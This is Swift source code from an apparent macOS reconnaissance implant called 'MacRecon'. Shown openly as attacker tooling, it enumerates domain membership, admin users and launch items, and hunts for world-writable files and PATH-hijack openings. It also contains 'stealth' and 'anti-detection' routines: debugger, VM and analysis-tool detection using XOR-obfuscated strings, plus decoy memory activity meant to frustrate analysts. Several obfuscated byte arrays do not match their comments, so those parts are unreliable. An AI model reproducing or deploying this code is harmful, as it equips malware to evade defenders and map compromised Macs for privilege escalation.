// Check if the current machine is on a domain
    static func checkDomainStatus() -> (inDomain: Bool, domainName: String?) {
        var inDomain = false
        var domainName: String? = nil
        
        // Check for common AD/domain integration files
        let adConfigPaths = [
            "/Library/Preferences/OpenDirectory/Configurations/Active Directory.plist",
            "/Library/Preferences/DirectoryService/ActiveDirectory.plist",
            "/Library/Preferences/com.apple.opendirectoryd.plist"
        ]
        
        for path in adConfigPaths {
            if FileManager.default.fileExists(atPath: path) {
                inDomain = true
                break
            }
        }
        
        // Check for NoMAD or Jamf Connect (modern AD auth methods without binding)
        let modernAuthPaths = [
            "/Applications/NoMAD.app",
            "/Applications/Jamf Connect.app",
            "/Library/LaunchAgents/com.trusourcelabs.NoMAD.plist",
            "/Library/LaunchAgents/com.jamf.connect.plist"
        ]
        
        for path in modernAuthPaths {
            if FileManager.default.fileExists(atPath: path) {
                inDomain = true
                break
            }
        }
        
        // Try to get domain name from SCDynamicStore if we suspect we're on a domain
        if inDomain {
            let store = SCDynamicStoreCreate(nil, "MacRecon" as CFString, nil, nil)
            if let computerName = SCDynamicStoreCopyComputerName(store, nil) as String? {
                // Parse domain from FQDN - if computer name contains dots, it's likely FQDN
                if computerName.contains(".") {
                    let components = computerName.components(separatedBy: ".")
                    if components.count > 1 {
                        // Domain is everything after the first component
                        domainName = components.dropFirst().joined(separator: ".")
                    }
                }
            }
            
            // Try another method - check Active Directory specific keys
            if let domains = SCDynamicStoreCopyValue(store, "com.apple.opendirectoryd.ActiveDirectory" as CFString) as? [String: Any] {
                if let forest = domains["Forest"] as? String {
                    domainName = forest
                } else if let domain = domains["Domain"] as? String {
                    domainName = domain
                }
            }
        }
        
        return (inDomain, domainName)
    }
    
    // MARK: - Advanced Stealth Utilities
    
    // Check for any debugging or analysis tools that might be monitoring us
    static func checkForAnalysisTools() -> [String] {
        var analysisTools = [String]()
        
        // Use our process list we already have
        let processes = getRunningProcesses()
        
        // Obfuscated list of analysis tool names
        let analysisToolNamesObfuscated: [[UInt8]] = [
            [0x45, 0x55, 0x59, 0x42, 0x44, 0x46], // dtrace
            [0x43, 0x43, 0x45, 0x43, 0x56, 0x48], // lldbg
            [0x48, 0x45, 0x43], // gdb
            [0x58, 0x4e, 0x58, 0x42, 0x59, 0x46], // vmware
            [0x57, 0x42, 0x59, 0x42, 0x43, 0x43, 0x46, 0x43], // parallel
            [0x57, 0x42, 0x59, 0x42, 0x43, 0x43, 0x46, 0x43, 0x54, 0x45, 0x46, 0x54, 0x4c, 0x55, 0x50, 0x57], // parallelsdesktop
            [0x58, 0x46, 0x59, 0x55, 0x56, 0x42, 0x43, 0x43, 0x50, 0x59], // virtualbox
            [0x47, 0x54, 0x56, 0x54, 0x42, 0x48, 0x46], // fsusage
            [0x54, 0x56, 0x45, 0x50], // sudo
            [0x45, 0x45], // dd
            [0x5c, 0x46, 0x59, 0x50, 0x54, 0x46, 0x54], // Wireshark
            [0x55, 0x44, 0x57, 0x45, 0x56, 0x4e, 0x57], // tcpdump
            [0x4c, 0x55, 0x59, 0x42, 0x44, 0x46], // ktrace
            [0x4e, 0x50, 0x4f, 0x46, 0x55, 0x50, 0x59, 0x0f, 0x57, 0x59, 0x50, 0x47, 0x46, 0x43, 0x46, 0x59], // monitor profiler
            [0x46, 0x4f, 0x54, 0x59, 0x56, 0x4e, 0x46, 0x4f, 0x55, 0x4e, 0x50, 0x4f, 0x46, 0x55, 0x50, 0x59], // instrumentmonitor
            [0x46, 0x4f, 0x54, 0x55, 0x59, 0x56, 0x4e, 0x46, 0x4f, 0x55, 0x54], // instruments
            [0x46, 0x4f, 0x54, 0x55, 0x59, 0x56, 0x4e, 0x46, 0x4f, 0x55, 0x44, 0x50, 0x4f, 0x54, 0x50, 0x43, 0x46, 0x45, 0x42, 0x46, 0x4e, 0x50, 0x4f], // instrumentconsoledaemon
            [0x44, 0x50, 0x4f, 0x54, 0x50, 0x43, 0x46, 0x7f, 0x43, 0x50, 0x48], // console.log
        ]
        
        for process in processes {
            let processLower = process.lowercased()
            for obfuscatedName in analysisToolNamesObfuscated {
                let toolName = deobfuscate(obfuscatedName, key: xorKey)
                if processLower.contains(toolName.lowercased()) {
                    analysisTools.append(process)
                    break
                }
            }
        }
        
        return analysisTools
    }
    
    // Detect if we're running in a virtual machine
    static func isRunningInVM() -> Bool {
        // Multiple detection methods for VMs
        
        // Method 1: Check for VM-specific hardware models
        let modelName = getHardwareModel()
        let vmModelIdentifiers = [
            "VMware", "Virtual Machine", "VirtualBox", "HVM domU", "Parallels", "QEMU"
        ]
        
        for identifier in vmModelIdentifiers {
            if modelName.contains(identifier) {
                return true
            }
        }
        
        // Method 2: Check for VM-specific IOKit properties
        if checkIOKitForVMSignatures() {
            return true
        }
        
        // Method 3: Check for VM-specific files or directories
        let vmFiles = [
            "/Library/Application Support/VMware Tools",
            "/Library/Application Support/VirtualBox Guest Additions",
            "/Library/Parallels Guest Tools",
            "/.vmware",
            "/etc/vmware",
            "/usr/bin/vmware-tools-daemon"
        ]
        
        for file in vmFiles {
            if FileManager.default.fileExists(atPath: file) {
                return true
            }
        }
        
        return false
    }
    
    // Get hardware model using IOKit
    private static func getHardwareModel() -> String {
        let service = IOServiceGetMatchingService(kIOMainPortDefault, IOServiceMatching("IOPlatformExpertDevice"))
        if service == 0 { return "Unknown" }
        
        defer { IOObjectRelease(service) }
        
        if let modelData = IORegistryEntryCreateCFProperty(service, "model" as CFString, kCFAllocatorDefault, 0).takeRetainedValue() as? Data {
            if let model = String(data: modelData, encoding: .utf8) {
                return model
            }
        }
        
        return "Unknown"
    }
    
    // Check IOKit for VM-specific signatures
    private static func checkIOKitForVMSignatures() -> Bool {
        // This method uses IOKit to look for VM-specific hardware properties
        let service = IOServiceGetMatchingService(kIOMainPortDefault, IOServiceMatching("IOPlatformExpertDevice"))
        if service == 0 { return false }
        
        defer { IOObjectRelease(service) }
        
        // VM-specific properties to check for
        let vmProperties = ["VMware", "VirtualBox", "Parallels", "QEMU", "Xen"]
        
        // Check manufacturer string
        if let manufacturerData = IORegistryEntryCreateCFProperty(service, "manufacturer" as CFString, kCFAllocatorDefault, 0).takeRetainedValue() as? Data,
           let manufacturer = String(data: manufacturerData, encoding: .utf8) {
            for vmProp in vmProperties {
                if manufacturer.contains(vmProp) {
                    return true
                }
            }
        }
        
        return false
    }
    
    // MARK: - Anti-Detection Methods
    
    // Randomize our process memory access pattern to avoid detection
    static func randomizedMemoryAccess() {
        // This performs some meaningless but random memory operations
        // which can help defeat some memory access pattern analysis
        let size = Int.random(in: 100...1000)
        var array = [UInt8](repeating: 0, count: size)
        
        // Fill with random data
        for i in 0..<size {
            array[i] = UInt8.random(in: 0...255)
        }
        
        // Random memory access pattern
        for _ in 0..<20 {
            let idx = Int.random(in: 0..<size)
            array[idx] = array[idx] ^ UInt8.random(in: 0...255)
        }
    }
    
    // Check for suspicious environment variables that might indicate monitoring
    static func checkForSuspiciousEnvVars() -> [String] {
        var suspiciousVars = [String]()
        
        // Obfuscated suspicious environment variable names
        let suspiciousEnvVarsObfuscated: [[UInt8]] = [
            [0x45, 0x5f, 0x4f, 0x42, 0x4e, 0x46, 0x44], // DYNAME
            [0x45, 0x5f, 0x43, 0x45, 0x62, 0x46, 0x4f, 0x54, 0x46, 0x59, 0x55], // DYLD_INSERT
            [0x45, 0x5f, 0x43, 0x45, 0x62, 0x57, 0x59, 0x46, 0x43, 0x50, 0x42, 0x45], // DYLD_PRELOAD
            [0x45, 0x5f, 0x43, 0x45, 0x62, 0x47, 0x50, 0x59, 0x44, 0x46, 0x62, 0x57, 0x42, 0x55, 0x49], // DYLD_FORCE_PATH
            [0x45, 0x5f, 0x43, 0x45, 0x62, 0x57, 0x59, 0x46, 0x4f, 0x55, 0x62, 0x46, 0x4e, 0x42, 0x48, 0x46], // DYLD_PRINT_IMAGE
            [0x45, 0x5f, 0x43, 0x45, 0x62, 0x43, 0x46, 0x43, 0x59, 0x42, 0x59, 0x5f, 0x62, 0x57, 0x42, 0x55, 0x49], // DYLD_LIBRARY_PATH
            [0x54, 0x43, 0x42, 0x62, 0x45, 0x46, 0x43, 0x56, 0x48, 0x48, 0x46, 0x59], // SLA_DEBUGGER
            [0x4e, 0x42, 0x43, 0x43, 0x50, 0x44, 0x62, 0x45, 0x46, 0x43, 0x56, 0x48, 0x48, 0x46, 0x59], // MALLOC_DEBUGGER
            [0x43, 0x46, 0x43, 0x59, 0x42, 0x59, 0x5f, 0x62, 0x57, 0x59, 0x46, 0x43, 0x50, 0x42, 0x45], // LIBRARY_PRELOAD
            [0x50, 0x54, 0x62, 0x55, 0x59, 0x42, 0x44, 0x46], // OS_TRACE
            [0x45, 0x46, 0x43, 0x56, 0x48, 0x62, 0x46, 0x4f, 0x42, 0x43, 0x43, 0x46], // DEBUG_ENABLE
            [0x45, 0x46, 0x43, 0x56, 0x48, 0x62, 0x4e, 0x50, 0x45, 0x46], // DEBUG_MODE
        ]
        
        // Get all environment variables
        let environment = ProcessInfo.processInfo.environment
        
        // Check for suspicious vars
        for (key, _) in environment {
            for obfuscatedVar in suspiciousEnvVarsObfuscated {
                let suspiciousVar = deobfuscate(obfuscatedVar, key: xorKey)
                if key.uppercased().contains(suspiciousVar) {
                    suspiciousVars.append(key)
                    break
                }
            }
        }
        
        return suspiciousVars
    }
    
    // Check for debugger attachment
    static func isBeingDebugged() -> Bool {
        // Method 1: Use sysctl to check for debugger
        var info = kinfo_proc()
        var mib: [Int32] = [CTL_KERN, KERN_PROC, KERN_PROC_PID, getpid()]
        var size = MemoryLayout<kinfo_proc>.size
        
        let junk = sysctl(&mib, UInt32(mib.count), &info, &size, nil, 0)
        if junk != 0 {
            return false
        }
        
        return (info.kp_proc.p_flag & P_TRACED) != 0
        
        // Note: We could add more sophisticated methods but this is a good start
    }
    
    // MARK: - Elevated Privileges Detection
    
    // Check if process is running with admin privileges (different from isUserAdmin)
    static func isProcessAdmin() -> Bool {
        // Check if effective UID is 0 (root)
        return geteuid() == 0
    }
    
    // Get list of all admin users on the system
    static func getAdminUsers() -> [String] {
        var adminUsers = [String]()
        
        // Get the admin group ID
        guard let adminGroup = getgrnam("admin") else { return [] }
        let adminGid = adminGroup.pointee.gr_gid
        
        // Get all users
        var current = getpwent()
        while current != nil {
            let user = current!.pointee
            let username = String(cString: user.pw_name)
            
            // Check if user is in admin group
            var isMember = false
            
            // Check primary group
            if user.pw_gid == adminGid {
                isMember = true
            } else {
                // Check supplementary groups
                var groups = [gid_t](repeating: 0, count: 32)
                var count: Int32 = 32
                
                if getgrouplist(user.pw_name, user.pw_gid, &groups, &count) >= 0 {
                    for i in 0..<Int(count) {
                        if groups[i] == adminGid {
                            isMember = true
                            break
                        }
                    }
                }
            }
            
            if isMember {
                adminUsers.append(username)
            }
            
            current = getpwent()
        }
        endpwent()
        
        return adminUsers
    }
    
    // MARK: - LaunchAgents and LaunchDaemons
    
    // Get all LaunchAgents and LaunchDaemons
    static func getLaunchItems() -> [String: [String]] {
        var launchItems = [String: [String]]()
        
        // Launch paths to check (obfuscated)
        let launchPathsObfuscated: [[UInt8]] = [
            [0x0f, 0x43, 0x46, 0x43, 0x59, 0x42, 0x59, 0x5f, 0x0f, 0x43, 0x42, 0x56, 0x4f, 0x44, 0x49, 0x45, 0x42, 0x46, 0x4e, 0x50, 0x4f, 0x54], // "/Library/LaunchDaemons"
            [0x0f, 0x43, 0x46, 0x43, 0x59, 0x42, 0x59, 0x5f, 0x0f, 0x43, 0x42, 0x56, 0x4f, 0x44, 0x49, 0x42, 0x48, 0x46, 0x4f, 0x55, 0x54], // "/Library/LaunchAgents"
            [0x0f, 0x56, 0x54, 0x46, 0x59, 0x54, 0x0f, 0x0f, 0x43, 0x46, 0x43, 0x59, 0x42, 0x59, 0x5f, 0x0f, 0x43, 0x42, 0x56, 0x4f, 0x44, 0x49, 0x42, 0x48, 0x46, 0x4f, 0x55, 0x54], // "/Users//Library/LaunchAgents"
            [0x0f, 0x54, 0x5f, 0x54, 0x55, 0x46, 0x4e, 0x0f, 0x43, 0x42, 0x56, 0x4f, 0x44, 0x49, 0x45, 0x42, 0x46, 0x4e, 0x50, 0x4f, 0x54], // "/System/LaunchDaemons"
            [0x0f, 0x54, 0x5f, 0x54, 0x55, 0x46, 0x4e, 0x0f, 0x43, 0x42, 0x56, 0x4f, 0x44, 0x49, 0x42, 0x48, 0x46, 0x4f, 0x55, 0x54], // "/System/LaunchAgents"
        ]
        
        let fileManager = FileManager.default
        
        // Process each launch path
        for obfuscatedPath in launchPathsObfuscated {
            var path = deobfuscate(obfuscatedPath, key: xorKey)
            
            // If path contains a placeholder for username, replace it
            if path.contains("//") {
                path = path.replacingOccurrences(of: "//", with: "/\(NSUserName())/")
            }
            
            var items = [String]()
            
            // List all plist files in the directory
            do {
                let contents = try fileManager.contentsOfDirectory(atPath: path)
                for item in contents {
                    if item.hasSuffix(".plist") {
                        let fullPath = (path as NSString).appendingPathComponent(item)
                        items.append(fullPath)
                    }
                }
            } catch {
                // Directory might not exist or not be accessible
                continue
            }
            
            // Store results
            launchItems[path] = items
        }
        
        return launchItems
    }
    
    // MARK: - File Permission Utilities
    
    // Check if a file is world writable
    static func isWorldWritable(path: String) -> Bool {
        // Use stat to get file permissions
        var statInfo = stat()
        if stat(path, &statInfo) != 0 {
            return false
        }
        
        // Check if others have write permission (S_IWOTH)
        return (statInfo.st_mode & S_IWOTH) != 0
    }
    
    // Find world-writable files in sensitive directories
    static func findWorldWritableFiles(in directories: [String]) -> [String] {
        var worldWritableFiles = [String]()
        let fileManager = FileManager.default
        
        for directory in directories {
            // Skip if directory doesn't exist
            if !fileManager.fileExists(atPath: directory) {
                continue
            }
            
            // Recursively enumerate directory contents
            guard let enumerator = fileManager.enumerator(atPath: directory) else {
                continue
            }
            
            while let file = enumerator.nextObject() as? String {
                let fullPath = (directory as NSString).appendingPathComponent(file)
                
                // Skip symbolic links and check permissions
                var isDirectory: ObjCBool = false
                if fileManager.fileExists(atPath: fullPath, isDirectory: &isDirectory) && !isDirectory.boolValue {
                    if isWorldWritable(path: fullPath) {
                        worldWritableFiles.append(fullPath)
                    }
                }
            }
        }
        
        return worldWritableFiles
    }
    
    // MARK: - Path Hijacking Check
    
    // Check for potential PATH hijacking opportunities
    static func checkPathHijack() -> (vulnerable: Bool, writableDirs: [String]) {
        var vulnerableToHijack = false
        var writableDirs = [String]()
        
        // Get PATH environment variable
        guard let pathEnv = ProcessInfo.processInfo.environment["PATH"] else {
            return (false, [])
        }
        
        // Split PATH into directories
        let pathDirs = pathEnv.components(separatedBy: ":")
        
        // Check each directory for write permissions
        for dir in pathDirs {
            if isWorldWritable(path: dir) || isUserWritable(path: dir) {
                vulnerableToHijack = true
                writableDirs.append(dir)
            }
        }
        
        return (vulnerableToHijack, writableDirs)
    }
    
    // Check if current user can write to a path
    private static func isUserWritable(path: String) -> Bool {
        // Check if the current user can write to this directory
        return FileManager.default.isWritableFile(atPath: path)
    }
}
